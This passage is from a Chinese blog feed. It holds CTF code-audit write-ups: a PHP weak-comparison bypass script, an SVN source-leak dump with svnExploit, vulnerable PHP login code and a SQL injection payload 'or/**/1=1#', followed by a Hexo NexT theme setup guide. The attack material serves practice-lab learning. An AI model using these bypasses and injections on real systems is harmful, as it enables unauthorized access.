class="string">&quot;this is your md5:<span class="subst">$md5</span>[0]&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;maybe you need more think think!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$sub</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$md5</span>[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$guessmd5</span>,<span class="number">0</span>,<span class="number">5</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;plase give me the md5!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先看获得 flag 的条件 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$md5</span>[<span class="number">0</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>[<span class="number">0</span>])&amp;&amp;<span class="variable">$md5</span>[<span class="number">1</span>]===<span class="variable">$guessmd5</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;well!you win again!now flag is yours.&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>第一个 <code>$md5[0]==md5($md5[0])</code> 弱类型比较这个可以通过 <code>0e</code>绕过,但是 md5[0] 经过了 substr 的处理，根据这个函数的特性，要想不改变 md5[0] 的值只能让 <code>sub=0</code>，sub 又是来自于 <code>time</code> 的最后一位数字，所以这个需要用脚本多跑几次。</p><p><img src="/../image/NSSCTF-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/7-1.png" alt="7-1"></p><p>第二个条件 <code>$md5[1]===$guessmd5</code>，guessmd5 是来自对当前时间进行 md5，所以我们只能由 python 脚本来获取当前时间才能得到 md5[1] 的值</p><p>md5[0] 和 md5[1] 来自于 GET 传参的 md5，经过 preg_replace 函数会替换 0e ，可以用用 <code>%0a </code>来绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$md5</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/^(.*)0e(.*)$/&#x27;</span>,<span class="string">&#x27;$&#123;1&#125;no_science_notation!$&#123;2&#125;&#x27;</span>,<span class="variable">$md5</span>);</span><br></pre></td></tr></table></figure><p>所以我们的 $md5 其实要传入 md5[0]  和 md5[1]</p><p>python 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time <span class="keyword">as</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    times = <span class="built_in">str</span>(<span class="built_in">int</span>(time.time()))</span><br><span class="line">    <span class="built_in">print</span>(times)</span><br><span class="line">    md5 = hashlib.md5(times.encode())</span><br><span class="line">    md5value = md5.hexdigest()</span><br><span class="line">    url = <span class="string">&quot;http://1.14.71.254:28465/?md5[0]=%0a0e215962017&amp;&amp;md5[1]=&quot;</span> + md5value</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    proxies = &#123; <span class="string">&quot;http&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;https&quot;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">    res = requests.get(url=url,proxies=proxies)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>但是不知道为什么我在 windows 下面跑不出来却能在 kali 里面跑出来，真是奇特</p><p><img src="/../image/NSSCTF-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/7-2.png" alt="7-2"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;NSSCTF 上写的几道代码审计题目&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="https://s1ient.github.io/categories/web/"/>
    
    
    <category term="php代码审计" scheme="https://s1ient.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="NSSCTF" scheme="https://s1ient.github.io/tags/NSSCTF/"/>
    
    <category term="phar反序列化" scheme="https://s1ient.github.io/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>安鸾-代码审计</title>
    <link href="https://s1ient.github.io/post/23e7ef64.html"/>
    <id>https://s1ient.github.io/post/23e7ef64.html</id>
    <published>2023-03-09T11:19:32.000Z</published>
    <updated>2023-05-10T05:57:59.652Z</updated>
    
    <content type="html"><![CDATA[<p>几道 安鸾 上的代码审计题目</p><span id="more"></span><h1 id="PHP代码审计01"><a href="#PHP代码审计01" class="headerlink" title="PHP代码审计01"></a>PHP代码审计01</h1><p>右下角有链接，一路点下去来到一个查询界面</p><p><img src="/../image/%E5%AE%89%E9%B8%BE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1-2.png" alt="1-2"></p><p>题目提示有源码泄露,用 7knscan 扫描目录</p><p>但是尴尬的是我的字典没有把想要的目录扫出来，看 wp 才知道是 <code>svn</code> 源码泄露，看来还是要扩充下字典</p><p>这里使用 svnExploit 来获取源码，先要下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/admintony/svnExploit</span><br><span class="line">python3 SvnExploit.py -u http://47.100.220.113:8017/.svn --dump </span><br></pre></td></tr></table></figure><p><img src="/../image/%E5%AE%89%E9%B8%BE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1-1.png" alt="1-1"></p><p>在 dbs 文件夹里面可以找到下载下来的源码</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;black_hat&#x27;</span>) <span class="keyword">or</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: route.php?act=index&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;hat&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;hat&#x27;</span>]==<span class="string">&#x27;green&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">output</span>(<span class="string">&quot;&lt;img src=&#x27;green-hat-1.jpg&#x27;&gt;&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a href=&#x27;logout.php&#x27;&gt;妥妥的绿帽子，再给你一次机会吧!&lt;/a&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">output</span>(<span class="string">&quot;&lt;img src=&#x27;black-fedora.jpg&#x27;&gt;&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a href=&#x27;logout.php&#x27;&gt;哎呦不错哦，再来一次。&lt;/a&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">output</span>(<span class="string">&quot;&lt;img src=&#x27;white-hat.jpg&#x27;&gt;&quot;</span>,<span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a href=&#x27;login.php&#x27;&gt;哥想知道自己的真正实力!&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$content</span>,<span class="variable">$count</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$count</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面 11 行输出 flag，条件是 <code>$_SESSION[&#39;hat&#39;]==&#39;black</code> </p><p>login.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;black_hat&#x27;</span>) <span class="keyword">or</span> <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: route.php?act=login&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;common.php&quot;</span>;</span><br><span class="line"><span class="variable">$connect</span>=<span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;there is no ctf!&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&quot;hats&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;there is no hats!&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">  <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>])));</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$name</span>) &gt; <span class="number">11</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;name too long&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select count(*) from t_info where username = &#x27;<span class="subst">$name</span>&#x27; or nickname = &#x27;<span class="subst">$name</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">0</span>])&#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;hat&#x27;</span>] = <span class="string">&#x27;black&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;good job&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;hat&#x27;</span>] = <span class="string">&#x27;green&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个里面 17 行会使 <code>hat == black</code> ，条件是 <code>$row[0]</code>为真，再就是 <a href="mysql_fetch_array">mysql_fetch_array </a>函数，传入了 <code>result</code>，我们得要 result 有数据就行，12 行的 sql 语句传入 <code>name</code>，我们要让这个语句为真，即 <code>or 1=1</code>，利用 <code>waf</code> 函数对输入的  name 进行了过滤，这个函数在common.php 里面</p><p>common.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">2</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$connect</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;error 1&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&quot;hats&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;error 2&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">d_addslashes</span>(<span class="params"><span class="variable">$array</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>))&#123;</span><br><span class="line">            !<span class="title function_ invoke__">get_magic_quotes_gpc</span>() &amp;&amp; <span class="variable">$value</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">            <span class="title function_ invoke__">waf</span>(<span class="variable">$value</span>);</span><br><span class="line">            <span class="variable">$array</span>[<span class="variable">$key</span>]=<span class="variable">$value</span>;</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$Filt</span> = <span class="string">&quot;\bUNION.+SELECT\b|SELECT.+?FROM&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$Filt</span>.<span class="string">&quot;/is&quot;</span>,<span class="variable">$value</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;found a hacker&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$value</span>);  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$sid</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;sid&quot;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>,<span class="variable">$sid</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$data</span>[<span class="number">0</span>] &amp;&amp; <span class="variable">$data</span>[<span class="number">1</span>] &amp;&amp; <span class="variable">$data</span>[<span class="number">1</span>] == <span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>[<span class="number">0</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">sha1</span>(<span class="string">&quot;Fuck_you_man&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>.<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_login</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">encode</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;sid&quot;</span>,<span class="string">&quot;<span class="subst">$name</span>|<span class="subst">$data</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>waf 函数过滤了常见的 union、select、from 同时过滤了空格</p><p>route.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;black_hat&quot;</span>, <span class="string">&#x27;icq&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;common.php&quot;</span>);</span><br><span class="line"><span class="variable">$_POST</span>=<span class="title function_ invoke__">d_addslashes</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$_GET</span>=<span class="title function_ invoke__">d_addslashes</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;act&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;not hats&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在这里 5，6 行，把 POST 和 GET 送入了  <a href="https://www.w3school.com.cn/php/func_string_addslashes.asp">addslashes</a>，</p><ul><li>对<code>&#39;</code>进行转义，以后变成<code>\&#39;</code>,但经过 common.php 里替换单引号，最终就只剩<code>\</code>。</li><li>用<code>/**/</code>代替空格  然后通过<code>or 1=1</code>以及<code>#</code>注释掉后面的语句让整个语句永远为真。</li></ul><p>最后的 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or/**/1=1#&#x27;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;几道 安鸾 上的代码审计题目&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="https://s1ient.github.io/categories/web/"/>
    
    
    <category term="php代码审计" scheme="https://s1ient.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="安鸾" scheme="https://s1ient.github.io/tags/%E5%AE%89%E9%B8%BE/"/>
    
    <category term="SvnExploit" scheme="https://s1ient.github.io/tags/SvnExploit/"/>
    
  </entry>
  
  <entry>
    <title>NexT 主题设置</title>
    <link href="https://s1ient.github.io/post/ac8b041d.html"/>
    <id>https://s1ient.github.io/post/ac8b041d.html</id>
    <published>2023-03-09T05:49:07.000Z</published>
    <updated>2023-05-10T05:57:59.645Z</updated>
    
    <content type="html"><![CDATA[<p>好不容易弄好了图片问题，就想着去美化一下主题，起码现在的功能太少了</p><span id="more"></span><h1 id="添加菜单"><a href="#添加菜单" class="headerlink" title="添加菜单"></a>添加菜单</h1><p>进入 NexT 的  <code>_config.yml</code> 文件，搜索 menu (119行) 可以看到几个菜单</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">home</span>    <span class="comment">#首页</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">user</span>  <span class="comment">#关于</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">tags</span>  <span class="comment">#标签</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">th</span>  <span class="comment">#分类</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">archive</span>  <span class="comment">#归档</span></span><br><span class="line">  <span class="attr">schedule:</span> <span class="string">/schedule/</span> <span class="string">||</span> <span class="string">calendar</span>  <span class="comment">#日程表</span></span><br><span class="line">  <span class="attr">sitemap:</span> <span class="string">/sitemap.xml</span> <span class="string">||</span> <span class="string">sitemap</span>  <span class="comment">#站点地图</span></span><br><span class="line">  <span class="attr">commonweal:</span> <span class="string">/404/</span> <span class="string">||</span> <span class="string">heartbeat</span>  <span class="comment">#公益 404</span></span><br></pre></td></tr></table></figure><p>这里可以根据自己的需要来选择，只需要把前面的注释删掉就行了</p><p>但是我们只是有了这几个菜单，我们还应该为他们创建页面，运行下面的相关命令即可，你需要什么菜单就创建什么界面</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> page <span class="string">&quot;about&quot;</span></span><br><span class="line">hexo <span class="keyword">new</span> page <span class="string">&quot;tags&quot;</span></span><br><span class="line">hexo <span class="keyword">new</span> page <span class="string">&quot;categories&quot;</span></span><br></pre></td></tr></table></figure><p>新建 page 后，会在 source 目录下新建 <code>about</code>、<code>tags</code>、<code>categories</code>文件夹，每个文件夹下还会创建一个<code>index.md</code>文件表示关于、标签页分类页面，编辑这三个MarkDown文件可以自定义这三个页面的内容.</p><p>最后一步，编辑各页面对应的<code>index.md</code>文件，增加 type 即可。注意冒号 : 后必须空一格，title 和 date 是默认生成的。重新部署后能够看到效果。</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /source/about/index.md</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">about</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2023-03-09 14:06:04</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;about&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"> <span class="comment"># /source/tags/index.md</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">tages</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2023-03-09 14:06:04</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;tags&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"> <span class="comment"># /source/categories/index.md</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">categories</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2023-03-09 14:06:04</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;categories&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>在新建博文的头部，直接输入该博文的分类、标签等即可。分类只能有一个，标签能有多个，多个标签不能一行，注意下面的格式。</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Hello</span> <span class="string">World</span> <span class="comment"># 标题</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="string">/3/26</span> <span class="string">hh:mm:ss</span> <span class="comment"># 时间</span></span><br><span class="line"><span class="attr">categories:</span> <span class="comment"># 分类</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">分类</span>  <span class="comment"># 只能由一个</span></span><br><span class="line"><span class="attr">tags:</span> <span class="comment"># 标签</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">PS3</span>  <span class="comment"># 能有多个</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Games</span>  <span class="comment"># 一个标签一行</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="string">正文</span></span><br></pre></td></tr></table></figure><h1 id="设置菜单位置"><a href="#设置菜单位置" class="headerlink" title="设置菜单位置"></a>设置菜单位置</h1><p>搜索 <code>Scheme </code>可以看到四个选项，这个是用来设置菜单的位置的</p><p>这些描述是看不出来结构的，只有自己一个个试了才知道心仪哪个</p><p>想用哪个就取消注释即可，但是要把另外三个注释掉</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Schemes</span></span><br><span class="line"><span class="comment">#scheme: Muse  #这是默认的样式，黑白主调，大量留白；</span></span><br><span class="line"><span class="comment">#scheme: Mist  #Muse 的紧凑版本，整洁有序的单栏外观；</span></span><br><span class="line"><span class="attr">scheme:</span> <span class="string">Pisces</span>  <span class="comment">#双栏 Scheme，小家碧玉似的清新；</span></span><br><span class="line"><span class="comment">#scheme: Gemini #左侧是网站信息及目录，块 + 片段结构布局</span></span><br></pre></td></tr></table></figure><h1 id="设置圆角"><a href="#设置圆角" class="headerlink" title="设置圆角"></a>设置圆角</h1><p>由于我是新版本，需要在 source 文件夹下面新建一个 <code>_data</code> 文件夹，这个 source 文件夹就是刚才上面设置菜单的那个文件夹，也就是说 _data 文件夹和 about，tags 